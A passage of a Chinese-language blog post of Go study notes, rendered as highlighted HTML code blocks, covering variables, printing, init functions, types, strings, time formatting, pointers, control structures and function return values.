world!&quot;</span></span><br><span class="line">    numShips = <span class="number">50</span></span><br><span class="line">    city <span class="keyword">string</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">并行\同时赋值</span><br><span class="line">a, b, c = <span class="number">5</span>, <span class="number">7</span>, <span class="string">&quot;abc&quot;</span></span><br><span class="line"></span><br><span class="line">值交换</span><br><span class="line">a, b = b, a</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>变量的 <strong>命名规则</strong> 遵循骆驼命名法，即首个单词小写，每个新单词的首字母大写，例如：<code>numShips</code> 和 <code>startDate</code></p><p>一个变量（常量、类型或函数）在程序中都有一定的作用范围，称之为作用域。</p><p>如果一个变量在<strong>函数体外</strong>声明，则被认为是<strong>全局变量</strong>，可以在<strong>整个包、外部包（被导出后）</strong>使用，不管你声明在哪个源文件里或在哪个源文件里调用该变量。</p><p>在<strong>函数体内</strong>声明的变量称之为<strong>局部变量</strong>，它们的作用域只在<strong>函数体内</strong>，参数和返回值变量也是局部变量。</p><h3 id="打印"><a href="#打印" class="headerlink" title="打印"></a>打印</h3><p>函数 <code>fmt.Print</code> 和 <code>fmt.Println</code> 会自动使用格式化标识符 <code>%v</code> 对字符串进行格式化，两者都会在每个参数之间自动增加空格，而后者还会在字符串的最后加上一个换行符。例如：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">fmt.Print(<span class="string">&quot;Hello:&quot;</span>, <span class="number">23</span>)</span><br><span class="line">将输出：</span><br><span class="line">Hello: <span class="number">23</span></span><br></pre></td></tr></table></figure><h3 id="init-函数"><a href="#init-函数" class="headerlink" title="init 函数"></a>init 函数</h3><p>变量除了可以在全局声明中初始化，也可以在 init 函数中初始化。</p><p>不能够被人为调用，而是在每个包完成初始化后自动执行，并且执行优先级比 main 函数高。</p><p>一个源文件都可以包含且只包含一个 init 函数。初始化总是以单线程执行，并且按照包的依赖关系顺序执行。</p><p>init.go</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> trans</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;math&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> Pi <span class="keyword">float64</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">init</span><span class="params">()</span></span> &#123;</span><br><span class="line">   Pi = <span class="number">4</span> * math.Atan(<span class="number">1</span>) <span class="comment">// init() function computes Pi</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>user_init.go 中导入了包 trans（在相同的路径中）并且使用到了变量 Pi</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">   <span class="string">&quot;fmt&quot;</span></span><br><span class="line">   <span class="string">&quot;./trans&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> twoPi = <span class="number">2</span> * trans.Pi</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">   fmt.Printf(<span class="string">&quot;2*Pi = %g\n&quot;</span>, twoPi) <span class="comment">// 2*Pi = 6.283185307179586</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="基本类型和运算符"><a href="#基本类型和运算符" class="headerlink" title="基本类型和运算符"></a>基本类型和运算符</h3><p><strong>布尔类型 bool：</strong>布尔型的值只可以是常量 true 或者 false</p><p><strong>数字类型：</strong>整型 int 和浮点型 float</p><p><strong>格式化说明符：</strong>格式化字符串里，<code>%d</code> 用于格式化整数（<code>%x</code> 和 <code>%X</code> 用于格式化 16 进制表示的数字），<code>%g</code> 用于格式化浮点型（<code>%f</code> 输出浮点数，<code>%e</code> 输出科学计数表示法），<code>%0d</code> 用于规定输出定长的整数，其中开头的数字 0 是必须的。</p><p><strong>数字值转换：</strong>进行<code>a32bitInt = int32(a32Float)</code> 的转换时，小数点后的数字将被丢弃。</p><p><strong>复数：</strong>Go 拥有以下复数类型：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">complex64</span> (<span class="number">32</span> 位实数和虚数)</span><br><span class="line"><span class="keyword">complex128</span> (<span class="number">64</span> 位实数和虚数)</span><br></pre></td></tr></table></figure><p><strong>位运算：</strong></p><p>一元运算符：按位补足 <code>^</code>，位左移 <code>&lt;&lt;</code>，位右移 <code>&gt;&gt;</code></p><p>二元运算符：按位与 <code>&amp;</code>，按位或 <code>|</code>，按位异或 <code>^</code>，位清除 <code>&amp;^</code></p><p>逻辑运算符：<code>==</code> , <code>!=</code> , <code>&lt;</code> , <code>&lt;=</code> , <code>&gt;</code> , <code>&gt;=</code></p><p>算术运算符：常见可用于整数和浮点数的二元运算符有 <code>+</code>、<code>-</code>、<code>*</code> 和 <code>/</code>。</p><p>运算符与优先级：</p><p>有些运算符拥有较高的优先级，二元运算符的运算方向均是从左至右。下表列出了所有运算符以及它们的优先级，由上至下代表优先级由高到低：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">优先级   运算符</span><br><span class="line"> <span class="number">7</span>      ^ !</span><br><span class="line"> <span class="number">6</span>      * / % &lt;&lt; &gt;&gt; &amp; &amp;^</span><br><span class="line"> <span class="number">5</span>      + - | ^</span><br><span class="line"> <span class="number">4</span>      == != &lt; &lt;= &gt;= &gt;</span><br><span class="line"> <span class="number">3</span>      &lt;-</span><br><span class="line"> <span class="number">2</span>      &amp;&amp;</span><br><span class="line"> <span class="number">1</span>      ||</span><br></pre></td></tr></table></figure><p>当然，你可以通过使用括号来临时提升某个表达式的整体运算优先级。</p><p><strong>类型别名：</strong></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> TZ <span class="keyword">int</span></span><br></pre></td></tr></table></figure><p><strong>字符类型：</strong>char.go</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> ch <span class="keyword">int</span> = <span class="string">&#x27;\u0041&#x27;</span></span><br><span class="line"><span class="keyword">var</span> ch2 <span class="keyword">int</span> = <span class="string">&#x27;\u03B2&#x27;</span></span><br><span class="line"><span class="keyword">var</span> ch3 <span class="keyword">int</span> = <span class="string">&#x27;\U00101234&#x27;</span></span><br><span class="line">fmt.Printf(<span class="string">&quot;%d - %d - %d\n&quot;</span>, ch, ch2, ch3) <span class="comment">// integer</span></span><br><span class="line">fmt.Printf(<span class="string">&quot;%c - %c - %c\n&quot;</span>, ch, ch2, ch3) <span class="comment">// character</span></span><br><span class="line">fmt.Printf(<span class="string">&quot;%X - %X - %X\n&quot;</span>, ch, ch2, ch3) <span class="comment">// UTF-8 bytes</span></span><br><span class="line">fmt.Printf(<span class="string">&quot;%U - %U - %U&quot;</span>, ch, ch2, ch3) <span class="comment">// UTF-8 code point</span></span><br><span class="line"></span><br><span class="line">输出：</span><br><span class="line"><span class="number">65</span> - <span class="number">946</span> - <span class="number">1053236</span></span><br><span class="line">A - β - r</span><br><span class="line"><span class="number">41</span> - <span class="number">3</span>B2 - <span class="number">101234</span></span><br><span class="line">U+<span class="number">0041</span> - U+<span class="number">03</span>B2 - U+<span class="number">101234</span></span><br></pre></td></tr></table></figure><h3 id="字符串"><a href="#字符串" class="headerlink" title="字符串"></a>字符串</h3><p><code>string</code> 类型的零值为长度为零的字符串，即空字符串 <code>&quot;&quot;</code>。</p><p>一般的比较运算符（<code>==</code>、<code>!=</code>、<code>&lt;</code>、<code>&lt;=</code>、<code>&gt;=</code>、<code>&gt;</code>）通过在内存中按字节比较来实现字符串的对比。你可以通过函数<code>len()</code> 来获取字符串所占的字节长度，例如：<code>len(str)</code>。</p><p>字符串拼接符 <code>+</code>：两个字符串 <code>s1</code> 和 <code>s2</code> 可以通过 <code>s := s1 + s2</code> 、<code>s += &quot;world&quot;</code> 拼接在一起。</p><ul><li><p>解释字符串：</p><p>该类字符串使用双引号括起来，其中的相关的转义字符将被替换，这些转义字符包括：</p><ul><li><code>\n</code>：换行符</li><li><code>\r</code>：回车符</li><li><code>\t</code>：tab 键</li><li><code>\u</code> 或 <code>\U</code>：Unicode 字符</li><li><code>\\</code>：反斜杠自身</li></ul></li><li><p>非解释字符串：</p><p>该类字符串使用反引号括起来，支持换行，例如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#96;This is a raw string \n&#96; 中的 &#96;\n\&#96; 会被原样输出。</span><br></pre></td></tr></table></figure></li></ul><h3 id="时间和日期"><a href="#时间和日期" class="headerlink" title="时间和日期"></a>时间和日期</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;fmt&quot;</span></span><br><span class="line">    <span class="string">&quot;time&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> week time.Duration</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    t := time.Now()</span><br><span class="line">    fmt.Println(t) <span class="comment">// e.g. Wed Dec 21 09:52:14 +0100 RST 2011</span></span><br><span class="line">    fmt.Printf(<span class="string">&quot;%02d.%02d.%4d\n&quot;</span>, t.Day(), t.Month(), t.Year())</span><br><span class="line">    <span class="comment">// 21.12.2011</span></span><br><span class="line">    t = time.Now().UTC()</span><br><span class="line">    fmt.Println(t) <span class="comment">// Wed Dec 21 08:52:14 +0000 UTC 2011</span></span><br><span class="line">    fmt.Println(time.Now()) <span class="comment">// Wed Dec 21 09:52:14 +0100 RST 2011</span></span><br><span class="line">    <span class="comment">// calculating times:</span></span><br><span class="line">    week = <span class="number">60</span> * <span class="number">60</span> * <span class="number">24</span> * <span class="number">7</span> * <span class="number">1e9</span> <span class="comment">// must be in nanosec</span></span><br><span class="line">    week_from_now := t.Add(week)</span><br><span class="line">    fmt.Println(week_from_now) <span class="comment">// Wed Dec 28 08:52:14 +0000 UTC 2011</span></span><br><span class="line">    <span class="comment">// formatting times:</span></span><br><span class="line">    fmt.Println(t.Format(time.RFC822)) <span class="comment">// 21 Dec 11 0852 UTC</span></span><br><span class="line">    fmt.Println(t.Format(time.ANSIC)) <span class="comment">// Wed Dec 21 08:56:34 2011</span></span><br><span class="line">    fmt.Println(t.Format(<span class="string">&quot;02 Jan 2006 15:04&quot;</span>)) <span class="comment">// 21 Dec 2011 08:52</span></span><br><span class="line">    s := t.Format(<span class="string">&quot;20060102&quot;</span>)</span><br><span class="line">    fmt.Println(t, <span class="string">&quot;=&gt;&quot;</span>, s)</span><br><span class="line">    <span class="comment">// Wed Dec 21 08:52:14 +0000 UTC 2011 =&gt; 20111221</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="指针"><a href="#指针" class="headerlink" title="指针"></a>指针</h3><p>程序在内存中存储它的值，每个内存块（或字）有一个<strong>地址</strong>，通常用<strong>十六进制数</strong>表示，如：<code>0x6b0820</code> 或<code>0xf84001d7f0</code>。</p><p><strong>一个指针变量可以指向任何一个值的内存地址</strong> 它指向那个值的内存地址，在 32 位机器上占用 4 个字节，在 64 位机器上占用 8 个字节，并且与它所指向的值的大小无关。</p><p>Go 语言的取地址符是 <code>&amp;</code>，放到一个变量前使用就会返回相应<strong>变量的内存地址</strong>。</p><p>指针类型前面加上<code>*</code>号（前缀）来<strong>获取指针所指向的内容</strong>，这里的 * 号是一个类型更改器。使用一个指针引用一个值被称为间接引用。</p><p>当一个指针被定义后<strong>没有分配到任何变量</strong>时，它的值为 <code>nil</code>。</p><p>一个指针变量通常缩写为 <code>ptr</code>。</p><p>例：展示了分配一个新的值给 *p 并且更改这个变量自己的值（这里是一个字符串）</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    s := <span class="string">&quot;good bye&quot;</span></span><br><span class="line">    <span class="keyword">var</span> p *<span class="keyword">string</span> = &amp;s</span><br><span class="line">    *p = <span class="string">&quot;ciao&quot;</span></span><br><span class="line">    fmt.Printf(<span class="string">&quot;Here is the pointer p: %p\n&quot;</span>, p) <span class="comment">// prints address</span></span><br><span class="line">    fmt.Printf(<span class="string">&quot;Here is the string *p: %s\n&quot;</span>, *p) <span class="comment">// prints string</span></span><br><span class="line">    fmt.Printf(<span class="string">&quot;Here is the string s: %s\n&quot;</span>, s) <span class="comment">// prints same string</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">输出：</span><br><span class="line">Here is the pointer p: <span class="number">0x2540820</span></span><br><span class="line">Here is the <span class="keyword">string</span> *p: ciao</span><br><span class="line">Here is the <span class="keyword">string</span> s: ciao</span><br></pre></td></tr></table></figure><h2 id="控制结构"><a href="#控制结构" class="headerlink" title="控制结构"></a>控制结构</h2><h3 id="if-else-结构"><a href="#if-else-结构" class="headerlink" title="if-else 结构"></a>if-else 结构</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> condition1 &#123;</span><br><span class="line">    <span class="comment">// do something </span></span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> condition2 &#123;</span><br><span class="line">    <span class="comment">// do something else    </span></span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// catch-all or default</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">判断一个字符串是否为空</span><br><span class="line"><span class="keyword">if</span> str == <span class="string">&quot;&quot;</span> &#123; ... &#125;</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(str) == <span class="number">0</span> &#123;...&#125;</span><br><span class="line"></span><br><span class="line">判断系统，分别提示</span><br><span class="line"><span class="keyword">var</span> prompt = <span class="string">&quot;Enter a digit, e.g. 3 &quot;</span>+ <span class="string">&quot;or %s to quit.&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">init</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="keyword">if</span> runtime.GOOS == <span class="string">&quot;windows&quot;</span> &#123;</span><br><span class="line">        prompt = fmt.Sprintf(prompt, <span class="string">&quot;Ctrl+Z, Enter&quot;</span>)       </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123; <span class="comment">//Unix-like</span></span><br><span class="line">        prompt = fmt.Sprintf(prompt, <span class="string">&quot;Ctrl+D&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="switch-结构"><a href="#switch-结构" class="headerlink" title="switch 结构"></a>switch 结构</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">switch</span> &#123;</span><br><span class="line">    <span class="keyword">case</span> condition1:</span><br><span class="line">        ...</span><br><span class="line">    <span class="keyword">case</span> condition2:</span><br><span class="line">        ...</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="for结构"><a href="#for结构" class="headerlink" title="for结构"></a>for结构</h3><h4 id="基于计数器的迭代"><a href="#基于计数器的迭代" class="headerlink" title="基于计数器的迭代"></a>基于计数器的迭代</h4><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="number">5</span>; i++ &#123;</span><br><span class="line">        fmt.Printf(<span class="string">&quot;This is the %d iteration\n&quot;</span>, i)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="for-range-结构"><a href="#for-range-结构" class="headerlink" title="for-range 结构"></a>for-range 结构</h4><p>它可以迭代任何一个集合（包括数组和 map)，一般形式为：<code>for ix, val := range coll &#123; &#125;</code>。</p><p><code>val</code> 始终为集合中对应索引的值拷贝，因此它一般只具有只读性质，对它所做的任何修改都不会影响到集合中原有的值（<strong>译者注：如果 <code>val</code> 为指针，则会产生指针的拷贝，依旧可以修改集合中的原值</strong>）</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> pos, char := <span class="keyword">range</span> str &#123;</span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Break-与-continue"><a href="#Break-与-continue" class="headerlink" title="Break 与 continue"></a>Break 与 continue</h3><p><code>break</code> 的作用范围为该语句出现后的最内部的结构，它可以被用于任何形式的 for 循环（计数器、条件判断等）。但在 switch 或 select 语句中，break 语句的作用结果是跳过整个代码块，执行后续的代码。</p><p><code>continue</code> 忽略剩余的循环体而直接进入下一次循环的过程，但不是无条件执行下一次循环，执行之前依旧需要满足循环的判断条件。</p><h3 id="标签与-goto"><a href="#标签与-goto" class="headerlink" title="标签与 goto"></a>标签与 goto</h3><p><code>for</code>、<code>switch</code> 或 <code>select</code> 语句都可以配合标签（label）形式的标识符使用，即某一行第一个以冒号（<code>:</code>）结尾的单词（gofmt 会将后续代码自动移至下一行）。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">LABEL1:</span><br><span class="line">    <span class="keyword">for</span> i := <span class="number">0</span>; i &lt;= <span class="number">5</span>; i++ &#123;</span><br><span class="line">        <span class="keyword">for</span> j := <span class="number">0</span>; j &lt;= <span class="number">5</span>; j++ &#123;</span><br><span class="line">            <span class="keyword">if</span> j == <span class="number">4</span> &#123;</span><br><span class="line">                <span class="keyword">continue</span> LABEL1</span><br><span class="line">            &#125;</span><br><span class="line">            fmt.Printf(<span class="string">&quot;i is: %d, and j is: %d\n&quot;</span>, i, j)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2 id="函数（function）"><a href="#函数（function）" class="headerlink" title="函数（function）"></a>函数（function）</h2><h3 id="函数参数与返回值"><a href="#函数参数与返回值" class="headerlink" title="函数参数与返回值"></a>函数参数与返回值</h3><h4 id="按值-引用传递"><a href="#按值-引用传递" class="headerlink" title="按值\引用传递"></a>按值\引用传递</h4><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    fmt.Printf(<span class="string">&quot;Multiply 2 * 5 * 6 = %d\n&quot;</span>, MultiPly3Nums(<span class="number">2</span>, <span class="number">5</span>, <span class="number">6</span>))</span><br><span class="line">    <span class="comment">// var i1 int = MultiPly3Nums(2, 5, 6)</span></span><br><span class="line">    <span class="comment">// fmt.Printf(&quot;MultiPly 2 * 5 * 6 = %d\n&quot;, i1)</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">MultiPly3Nums</span><span class="params">(a <span class="keyword">int</span>, b <span class="keyword">int</span>, c <span class="keyword">int</span>)</span> <span class="title">int</span></span> &#123;</span><br><span class="line">    <span class="comment">// var product int = a * b * c</span></span><br><span class="line">    <span class="comment">// return product</span></span><br><span class="line">    <span class="keyword">return</span> a * b * c</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">输出显示：</span><br><span class="line"></span><br><span class="line">Multiply <span class="number">2</span> * <span class="number">5</span> * <span class="number">6</span> = <span class="number">60</span></span><br></pre></td></tr></table></figure><h4 id="命名的返回值"><a href="#命名的返回值" class="headerlink" title="命名的返回值"></a>命名的返回值</h4><p><code>getX2AndX3</code> 与 <code>getX2AndX3_2</code> 两个函数演示了如何使用非命名返回值与命名返回值的特性。当需要返回多个非命名返回值时，需要使用 <code>()</code> 把它们括起来，比如 <code>(int, int)</code>。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> num <span class="keyword">int</span> = <span class="number">10</span></span><br><span class="line"><span class="keyword">var</span> numx2, numx3 <span class="keyword">int</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    numx2, numx3 = getX2AndX3(num)</span><br><span class="line">    PrintValues() <span class="comment">//输出：num = 10, 2x num = 20, 3x num = 30 </span></span><br><span class="line">    numx2, numx3 = getX2AndX3_2(num)</span><br><span class="line">    PrintValues() <span class="comment">//输出：num = 10, 2x num = 20, 3x num = 30  </span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">PrintValues</span><span class="params">()</span></span> &#123;</span><br><span class="line">    fmt.Printf(<span class="string">&quot;num = %d, 2x num = %d, 3x num = %d\n&quot;</span>, num, numx2, numx3)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">getX2AndX3</span><span class="params">(input <span class="keyword">int</span>)</span> <span class="params">(<span class="keyword">int</span>, <span class="keyword">int</span>)</span></span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">2</span> * input, <span class="number">3</span> * input</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">getX2AndX3_2</span><span class="params">(input <span class="keyword">int</span>)</span> <span class="params">(x2 <span class="keyword">int</span>, x3 <span class="keyword">int</span>)</span></span> &#123;</span><br><span class="line">    x2 = <span class="number">2</span> * input</span><br><span class="line">    x3 = <span class="number">3</span> * input</span><br><span class="line">    <span class="comment">// return x2, x3</span></span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="空白符"><a href="#空白符" class="headerlink" title="空白符"></a>空白符</h4><p>空白符用来匹配一些不需要的值，然后丢弃掉。<code>ThreeValues</code> 是拥有三个返回值的不需要任何参数的函数，在下面的例子中，我们将第一个与第三个返回值赋给了 <code>i1</code> 与<code>f1</code>。第二个返回值赋给了空白符 <code>_</code>，然后自动丢弃掉。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="keyword">var</span> i1 <span class="keyword">int</span></span><br><span class="line">    <span class="keyword">var</span> f1 <span class="keyword">float32</span></span><br><span class="line">    i1, _, f1 = ThreeValues()</span><br><span class="line">    fmt.Printf(<span class="string">&quot;The int: %d, the float: %f \n&quot;</span>, i1, f1) <span class="comment">//输出：The int: 5, the float: 7.500000</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">ThreeValues</span><span class="params">()</span> <span class="params">(<span class="keyword">int</span>, <span class="keyword">int</span>, <span class="keyword">float32</span>)</span></span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">5</span>, <span class="number">6</span>, <span class="number">7.5</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="改变外部变量"><a href="#改变外部变量" class="headerlink" title="改变外部变量"></a>改变外部变量</h4><p>传递指针给函数不但可以节省内存（因为没有复制变量的值），而且赋予了函数直接修改外部变量的能力，所以被修改的变量不再需要使用 <code>return</code> 返回。如下的例子，<code>reply</code> 是一个指向 <code>int</code> 变量的指针，通过这个指针，我们在函数内修改了这个 <code>int</code> 变量的数值。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span 